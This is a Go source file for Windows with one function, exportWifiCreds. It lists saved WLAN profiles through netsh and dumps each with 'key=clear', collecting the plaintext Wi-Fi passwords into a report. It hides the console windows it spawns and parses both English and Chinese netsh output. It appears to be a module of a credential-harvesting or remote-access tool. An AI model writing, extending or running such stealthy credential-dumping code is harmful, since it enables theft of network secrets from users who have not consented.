//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"strings"
)

func exportWifiCreds() string {
	profilesOut, err := runShell("netsh wlan show profiles", "cmd.exe")
	if err != nil && profilesOut == "" {
		return fmt.Sprintf("wifi_creds: failed to list profiles: %v\n", err)
	}

	re := regexp.MustCompile(`(?i):\s*(.+)\s*$`)
	var profiles []string
	for _, line := range strings.Split(profilesOut, "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(strings.ToLower(line), "all user profile") &&
			!strings.Contains(strings.ToLower(line), "所有用户配置文件") {
			continue
		}
		m := re.FindStringSubmatch(line)
		if len(m) < 2 {
			continue
		}
		name := strings.TrimSpace(m[1])
		if name != "" {
			profiles = append(profiles, name)
		}
	}

	if len(profiles) == 0 {
		return "wifi_creds: no WLAN profiles found\n"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== WiFi Credentials (%d profiles) ===\n", len(profiles)))
	for _, profile := range profiles {
		sb.WriteString(fmt.Sprintf("\n--- Profile: %s ---\n", profile))
		cmd := exec.Command("netsh", "wlan", "show", "profile", fmt.Sprintf("name=%s", profile), "key=clear")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			sb.WriteString(fmt.Sprintf("error: %v\n", err))
			continue
		}
		text := string(out)
		sb.WriteString(text)
		if !strings.Contains(strings.ToLower(text), "key content") &&
			!strings.Contains(text, "关键内容") {
			sb.WriteString("(password not exposed — may need elevated context)\n")
		}
	}
	return sb.String()
}